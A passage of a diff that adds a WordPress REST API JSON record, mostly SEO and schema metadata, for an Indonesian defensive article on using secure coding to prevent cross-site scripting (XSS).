enemy\"},\"url\":\"https://buletinsiber.com/author/public_enemy/\"}]}</script>\n<!-- / Yoast SEO plugin. -->",
+    "yoast_head_json": {
+      "title": "Penerapan Secure Coding untuk Mencegah XSS - buletinsiber.com",
+      "robots": {
+        "index": "index",
+        "follow": "follow",
+        "max-snippet": "max-snippet:-1",
+        "max-image-preview": "max-image-preview:large",
+        "max-video-preview": "max-video-preview:-1"
+      },
+      "canonical": "https://buletinsiber.com/penerapan-secure-coding-untuk-mencegah-xss/",
+      "og_locale": "en_US",
+      "og_type": "article",
+      "og_title": "Penerapan Secure Coding untuk Mencegah XSS - buletinsiber.com",
+      "og_description": "PendahuluanCross Site Scripting (XSS) adalah salah satu jenis serangan yang paling sering ditemukan dalam aplikasi web. Serangan ini terjadi ketika penyerang menyisipkan skrip berbahaya ke dalam halaman web, lalu dijalankan di browser pengguna. Akibatnya, data pengguna bisa dicuri, akun bisa dibajak, bahkan seluruh sistem bisa terganggu. Untuk mencegah hal ini, web developer perlu memahami pentingnya secure coding. Secure coding adalah praktik menulis kode yang aman sejak awal, bukan menunggu aplikasi jadi baru diperbaiki. Dengan memahami dan menerapkan prinsip secure coding, risiko XSS bisa dikurangi secara signifikan. Artikel ini akan membahas bagaimana secure coding dapat diterapkan untuk mencegah XSS. Pengertian Secure...",
+      "og_url": "https://buletinsiber.com/penerapan-secure-coding-untuk-mencegah-xss/",
+      "og_site_name": "buletinsiber.com",
+      "article_publisher": "https://www.facebook.com/publiksultra/",
+      "article_published_time": "2025-07-09T02:55:25+00:00",
+      "og_image": [
+        {
+          "width": 1200,
+          "height": 725,
+          "url": "https://buletinsiber.com/wp-content/uploads/2025/07/303.webp",
+          "type": "image/webp"
+        }
+      ],
+      "author": "public enemy",
+      "twitter_card": "summary_large_image",
+      "twitter_misc": {
+        "Written by": "public enemy",
+        "Est. reading time": "3 minutes"
+      },
+      "schema": {
+        "@context": "https://schema.org",
+        "@graph": [
+          {
+            "@type": "WebPage",
+            "@id": "https://buletinsiber.com/penerapan-secure-coding-untuk-mencegah-xss/",
+            "url": "https://buletinsiber.com/penerapan-secure-coding-untuk-mencegah-xss/",
+            "name": "Penerapan Secure Coding untuk Mencegah XSS - buletinsiber.com",
+            "isPartOf": {
+              "@id": "https://buletinsiber.com/#website"
+            },
+            "primaryImageOfPage": {
+              "@id": "https://buletinsiber.com/penerapan-secure-coding-untuk-mencegah-xss/#primaryimage"
+            },
+            "image": {
+              "@id": "https://buletinsiber.com/penerapan-secure-coding-untuk-mencegah-xss/#primaryimage"
+            },
+            "thumbnailUrl": "https://buletinsiber.com/wp-content/uploads/2025/07/303.webp",
+            "datePublished": "2025-07-09T02:55:25+00:00",
+            "dateModified": "2025-07-09T02:55:25+00:00",
+            "author": {
+              "@id": "https://buletinsiber.com/#/schema/person/f5a8529dcfc055c262c6563c6522fb91"
+            },
+            "breadcrumb": {
+              "@id": "https://buletinsiber.com/penerapan-secure-coding-untuk-mencegah-xss/#breadcrumb"
+            },
+            "inLanguage": "en-US",
+            "potentialAction": [
+              {
+                "@type": "ReadAction",
+                "target": [
+                  "https://buletinsiber.com/penerapan-secure-coding-untuk-mencegah-xss/"
+                ]
+              }
+            ]
+          },
+          {
+            "@type": "ImageObject",
+            "inLanguage": "en-US",
+            "@id": "https://buletinsiber.com/penerapan-secure-coding-untuk-mencegah-xss/#primaryimage",
+            "url": "https://buletinsiber.com/wp-content/uploads/2025/07/303.webp",
+            "contentUrl": "https://buletinsiber.com/wp-content/uploads/2025/07/303.webp",
+            "width": 1200,
+            "height": 725
+          },
+          {
+            "@type": "BreadcrumbList",
+            "@id": "https://buletinsiber.com/penerapan-secure-coding-untuk-mencegah-xss/#breadcrumb",
+            "itemListElement": [
+              {
+                "@type": "ListItem",
+                "position": 1,
+                "name": "Home",
+                "item": "https://buletinsiber.com/"
+              },
+              {
+                "@type": "ListItem",
+                "position": 2,
+                "name": "Penerapan Secure Coding untuk Mencegah XSS"
+              }
+            ]
+          },
+          {
+            "@type": "WebSite",
+            "@id": "https://buletinsiber.com/#website",
+            "url": "https://buletinsiber.com/",
+            "name": "buletinsiber.com",
+            "description": "sumber berita terupdate seputar keamanan siber dan teknologi terkini",
+            "alternateName": "buletin siber",
+            "potentialAction": [
+              {
+                "@type": "SearchAction",
+                "target": {
+                  "@type": "EntryPoint",
+                  "urlTemplate": "https://buletinsiber.com/?s={search_term_string}"
+                },
+                "query-input": {
+                  "@type": "PropertyValueSpecification",
+                  "valueRequired": true,
+                  "valueName": "search_term_string"
+                }
+              }
+            ],
+            "inLanguage": "en-US"
+          },
+          {
+            "@type": "Person",
+            "@id": "https://buletinsiber.com/#/schema/person/f5a8529dcfc055c262c6563c6522fb91",
+            "name": "public enemy",
+            "image": {
+              "@type": "ImageObject",
+              "inLanguage": "en-US",
+              "@id": "https://buletinsiber.com/#/schema/person/image/",
+              "url": "https://secure.gravatar.com/avatar/af7771d86188d142ee0d8c9c8feb4fdb5d463ff8959448100bf47ad25c3052c8?s=96&d=mm&r=g",
+              "contentUrl": "https://secure.gravatar.com/avatar/af7771d86188d142ee0d8c9c8feb4fdb5d463ff8959448100bf47ad25c3052c8?s=96&d=mm&r=g",
+              "caption": "public enemy"
+            },
+            "url": "https://buletinsiber.com/author/public_enemy/"
+          }
+        ]
+      }
+    },
+    "jetpack_publicize_connections": [],
+    "_links": {
+      "self": [
+        {
+          "href": "https://buletinsiber.com/wp-json/wp/v2/posts/4073",
+          "targetHints": {
+            "allow": [
+              "GET"
+            ]
+          }
+        }
+      ],
+      "collection": [
+        {
+          "href": "https://buletinsiber.com/wp-json/wp/v2/posts"
+        }
+      ],
+      "about": [
+        {
+          "href": "https://buletinsiber.com/wp-json/wp/v2/types/post"
+        }
+      ],
+      "author": [
+        {
+          "embeddable": true,
+          "href": "https://buletinsiber.com/wp-json/wp/v2/users/2"
+        }
+      ],
+      "replies": [
+        {
+          "embeddable": true,
+          "href": "https://buletinsiber.com/wp-json/wp/v2/comments?post=4073"
+        }
+      ],
+      "version-history": [
+        {
+          "count": 1,
+          "href": "https://buletinsiber.com/wp-json/wp/v2/posts/4073/revisions"
+        }
+      ],
+      "predecessor-version": [
+        {
+          "id": 4075,
+          "href": "https://buletinsiber.com/wp-json/wp/v2/posts/4073/revisions/4075"
+        }
+      ],
+      "wp:featuredmedia": [
+        {
+          "embeddable": true,
+          "href": "https://buletinsiber.com/wp-json/wp/v2/media/4074"
+        }
+      ],
+      "wp:attachment": [
+        {
+          "href": "https://buletinsiber.com/wp-json/wp/v2/media?parent=4073"
+        }
+      ],
+      "wp:term": [
+        {
+          "taxonomy": "category",
+          "embeddable": true,
+          "href": "https://buletinsiber.com/wp-json/wp/v2/categories?post=4073"
+        },
+        {
+          "taxonomy": "post_tag",
+          "embeddable": true,
+          "href": "https://buletinsiber.com/wp-json/wp/v2/tags?post=4073"
+        }
+      ],
+      "curies": [
+        {
+          "name": "wp",
+          "href": "https://api.w.org/{rel}",
+          "templated": true
+        }
+      ]
+    }
+  }
+}
